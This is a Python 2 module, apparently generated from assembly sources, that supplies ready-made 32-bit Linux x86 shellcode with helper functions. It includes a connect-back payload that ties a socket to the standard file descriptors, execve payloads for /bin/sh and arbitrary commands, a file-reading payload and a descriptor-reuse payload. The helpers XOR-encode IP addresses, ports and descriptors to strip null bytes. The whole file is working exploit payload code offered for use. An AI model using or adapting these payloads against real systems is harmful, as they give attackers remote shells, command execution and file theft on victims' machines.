#!/usr/bin/python

# THIS FILE WAS GENERATED BY RUNNING MAKE
# IF YOU WANT TO MODIFY THIS FILE, YOU SHOULD MODIFY THE SOURCE IN src/ THEN RUN make

# Date Created:
# Wed Oct 23 00:56:19 UTC 2013

# uname -a:
# Linux ubuntu 3.5.0-23-generic #35~precise1-Ubuntu SMP Fri Jan 25 17:15:33 UTC 2013 i686 i686 i386 GNU/Linux

# assembler:
# GNU assembler (GNU Binutils for Ubuntu) 2.22
# Copyright 2011 Free Software Foundation, Inc.
# This program is free software; you may redistribute it under the terms of
# the GNU General Public License version 3 or later.
# This program has absolutely no warranty.
# This assembler was configured for a target of `i686-linux-gnu'.

connect_shellcode = ""
connect_shellcode += "\xb8\x6e\x11\x11\x10\x35\x11\x11\x11\x11\x50\xb8\x13\x11\x15\xc3"
connect_shellcode += "\x35\x11\x11\x11\x11\x50\x89\xe6\x31\xc0\x50\xb0\x66\x31\xdb\x43"
connect_shellcode += "\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x31\xc0\xb0\x66\x31\xdb"
connect_shellcode += "\xb3\x03\x6a\x10\x56\x57\x89\xe1\xcd\x80\x31\xc9\x39\xc8\x75\x10"
connect_shellcode += "\x31\xc0\xb0\x3f\x89\xfb\xcd\x80\x41\x83\xf9\x04\x75\xf2\xeb\x07"
connect_shellcode += "\x31\xdb\x31\xc0\x40\xcd\x80"

execve_shellcode = ""
execve_shellcode += "\xeb\x2f\x5e\x89\xf0\x31\xdb\x53\xeb\x03\x88\x18\x40\x80\x38\xff"
execve_shellcode += "\x74\x09\x50\x80\x38\xff\x74\xf2\x40\xeb\xf8\x31\xc0\x50\x89\xe2"
execve_shellcode += "\x8d\x4c\x24\x04\x8b\x19\xb0\x0b\xcd\x80\x31\xdb\x31\xc0\x40\xcd"
execve_shellcode += "\x80\xe8\xcc\xff\xff\xff\x2d\x61\xff\x2f\x62\x69\x6e\x2f\x75\x6e"
execve_shellcode += "\x61\x6d\x65\xff\xff"

execve_sh_shellcode = ""
execve_sh_shellcode += "\xb8\xd0\x8c\x97\xff\x83\xf0\xff\x50\x68\x2f\x62\x69\x6e\x89\xe6"
execve_sh_shellcode += "\x31\xc0\x50\x89\xe2\x56\x89\xe1\xb0\x0b\x89\xf3\xcd\x80"

exit_shellcode = ""
exit_shellcode += "\x31\xdb\x31\xc0\x40\xcd\x80"

helloworld_shellcode = ""
helloworld_shellcode += "\xeb\x17\x5e\x31\xd2\xb2\x0d\x89\xf1\x31\xdb\x43\x31\xc0\xb0\x04"
helloworld_shellcode += "\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xe4\xff\xff\xff\x48\x65"
helloworld_shellcode += "\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x21\x0a"

readfile_shellcode = ""
readfile_shellcode += "\xeb\x3d\x5e\x31\xc0\x88\x66\x10\x31\xc0\xb0\x05\x89\xf3\x31\xc9"
readfile_shellcode += "\x31\xd2\xcd\x80\x89\xc7\x6a\x41\x31\xc0\xb0\x03\x89\xfb\x89\xe1"
readfile_shellcode += "\x31\xd2\x42\xcd\x80\x83\xf8\x01\x75\x0e\x92\x89\xe1\x31\xdb\x43"
readfile_shellcode += "\x31\xc0\xb0\x04\xcd\x80\xeb\xe0\x31\xdb\x31\xc0\x40\xcd\x80\xe8"
readfile_shellcode += "\xbe\xff\xff\xff\x72\x65\x61\x64\x66\x69\x6c\x65\x2e\x73\x7c"

reusefd_shellcode = ""
reusefd_shellcode += "\xbf\x14\x11\x11\x11\x81\xf7\x11\x11\x11\x11\x31\xc9\x31\xc0\xb0"
reusefd_shellcode += "\x3f\x89\xfb\xcd\x80\x41\x83\xf9\x04\x75\xf2"


def connect(ip, port):
	import struct
	import socket
	ip = socket.inet_aton(ip)
	port = struct.pack("!H", port)
	family = struct.pack("<H", 2)
	family_port = family+port
	ip_enc = ""
	ip_key = ""
	for m in ip:
		k = 0xFF
		if(ord(m) == k):
			k = 0xEE
		ip_key += chr(k)
		ip_enc += chr(ord(m) ^ k)
	fp_enc = ""
	fp_key = ""
	for m in family_port:
		k = 0xFF
		if(ord(m) == k):
			k = 0xEE
		fp_key += chr(k)
		fp_enc += chr(ord(m) ^ k)
	return connect_shellcode.replace("\xb8\x6e\x11\x11\x10\x35\x11\x11\x11\x11", "\xb8" + ip_enc + "\x35" + fp_key).replace("\xb8\x13\x11\x15\xc3\x35\x11\x11\x11\x11", "\xb8" + fp_enc + "\x35" + fp_key)


def execve(parameter_list):
	params = ""
	for x in reversed(parameter_list):
		params += x + "\xFF"
	params += "\xFF"
	return execve_shellcode[:-(len("-a\x00/bin/uname\x00\x00"))] + params

def execve_sh():
	return execve_sh_shellcode


def exit():
	return exit_shellcode


def helloworld():
	return helloworld_shellcode


def readfile(filename):
	import struct
	if(len(filename) > 127):
		import sys
		print "FILENAME TOO LONG"
		sys.exit(1)
	patch_null = "\x88\x66" + struct.pack("<b", len(filename))
	filename = filename + "|"
	return (readfile_shellcode[:-(len("readfile.s|"))] + filename).replace("\x88\x66\x10", patch_null)


def reusefd(fd):
	import struct
	fd_string = struct.pack("<I", int(fd))
	fd_enc = ""
	fd_key = ""
	for m in fd_string:
		k = 0xFF
		if(ord(m) == k):
			k = 0xEE
		fd_key += chr(k)
		fd_enc += chr(ord(m) ^ k)
	return reusefd_shellcode.replace("\xbf\x14\x11\x11\x11\x81\xf7\x11\x11\x11\x11", "\xbf" + fd_enc + "\x81\xf7" + fd_key)

